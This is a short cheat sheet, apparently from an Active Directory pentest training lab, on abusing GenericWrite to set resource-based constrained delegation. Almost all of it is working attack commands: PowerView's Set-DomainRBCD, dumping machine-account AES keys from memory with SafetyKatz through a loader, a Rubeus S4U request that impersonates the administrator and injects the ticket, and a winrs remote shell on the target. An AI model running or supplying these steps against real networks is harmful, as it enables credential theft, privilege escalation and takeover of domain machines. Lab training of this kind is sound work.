# RBCD via GenericWrite

If you have GenericWrite (or WriteDACL) on a computer object, set RBCD to allow your controlled machine account to impersonate any user to that target.

## Prerequisites
- GenericWrite on target computer
- Control of a machine account (e.g., your student machine `<student$>`)

## Set RBCD
```powershell
# Import PowerView
Set-DomainRBCD -Identity <TARGET_COMPUTER> -DelegateFrom '<student$>'
# Verify
Get-DomainRBCD -Identity <TARGET_COMPUTER>
```

## Get machine account hash
```
Loader.exe -path SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
# grab aes256 for <student$>
```

## Perform S4U
```
Loader.exe -path Rubeus.exe -args s4u /user:<student$> /aes256:<student_machine_aes256> /msdsspn:http/<TARGET_COMPUTER> /impersonateuser:administrator /ptt
```

## Verify / Execute
```
winrs -r:<TARGET_COMPUTER> cmd
```
Or use `Invoke-Command` to run commands on target.
